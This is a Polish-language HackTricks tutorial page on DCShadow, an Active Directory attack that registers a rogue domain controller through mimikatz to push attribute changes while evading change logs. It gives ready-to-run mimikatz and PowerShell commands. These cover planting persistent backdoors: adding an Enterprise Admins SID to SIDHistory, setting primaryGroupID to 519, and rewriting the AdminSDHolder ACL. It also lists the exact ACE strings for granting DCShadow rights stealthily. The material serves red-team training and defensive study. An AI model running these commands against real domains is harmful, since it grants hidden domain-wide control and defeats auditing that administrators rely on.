{{#include ../../banners/hacktricks-training.md}}

# DCShadow

Rejestruje **nowy kontroler domeny** w AD i używa go do **wypychania atrybutów** (SIDHistory, SPNs...) na określonych obiektach **bez** pozostawiania jakichkolwiek **logów** dotyczących **zmian**. Musisz mieć uprawnienia **DA** i być w **domenie głównej**.\
Zauważ, że jeśli użyjesz błędnych danych, pojawią się dość brzydkie logi.

Aby przeprowadzić atak, potrzebujesz 2 instancji mimikatz. Jedna z nich uruchomi serwery RPC z uprawnieniami SYSTEM (musisz tutaj wskazać zmiany, które chcesz wprowadzić), a druga instancja będzie używana do wypychania wartości:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Zauważ, że **`elevate::token`** nie zadziała w sesji `mimikatz1`, ponieważ podnosi uprawnienia wątku, ale musimy podnieść **uprawnienia procesu**.\
Możesz również wybrać obiekt "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Możesz wprowadzić zmiany z DA lub z użytkownika z minimalnymi uprawnieniami:

- W **obiekcie domeny**:
- _DS-Install-Replica_ (Dodaj/Usuń replikę w domenie)
- _DS-Replication-Manage-Topology_ (Zarządzaj topologią replikacji)
- _DS-Replication-Synchronize_ (Synchronizacja replikacji)
- Obiekt **Sites** (i jego dzieci) w **kontenerze konfiguracji**:
- _CreateChild i DeleteChild_
- Obiekt **komputera, który jest zarejestrowany jako DC**:
- _WriteProperty_ (Nie Write)
- Obiekt **docelowy**:
- _WriteProperty_ (Nie Write)

Możesz użyć [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1), aby nadać te uprawnienia użytkownikowi bez uprawnień (zauważ, że pozostawi to pewne logi). To jest znacznie bardziej restrykcyjne niż posiadanie uprawnień DA.\
Na przykład: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Oznacza to, że nazwa użytkownika _**student1**_ zalogowana na maszynie _**mcorp-student1**_ ma uprawnienia DCShadow do obiektu _**root1user**_.

## Używanie DCShadow do tworzenia backdoorów
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Przyznaj uprawnienia DCShadow za pomocą DCShadow (bez zmodyfikowanych logów uprawnień)

Musimy dodać następujące ACE z SID naszego użytkownika na końcu:

- Na obiekcie domeny:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Na obiekcie komputera atakującego: `(A;;WP;;;UserSID)`
- Na obiekcie użytkownika docelowego: `(A;;WP;;;UserSID)`
- Na obiekcie Sites w kontenerze Configuration: `(A;CI;CCDC;;;UserSID)`

Aby uzyskać aktualny ACE obiektu: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Zauważ, że w tym przypadku musisz wprowadzić **kilka zmian,** a nie tylko jedną. Tak więc, w **sesji mimikatz1** (serwer RPC) użyj parametru **`/stack` z każdą zmianą,** którą chcesz wprowadzić. W ten sposób będziesz musiał tylko **`/push`** raz, aby wykonać wszystkie zablokowane zmiany na fałszywym serwerze.

[**Więcej informacji o DCShadow na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
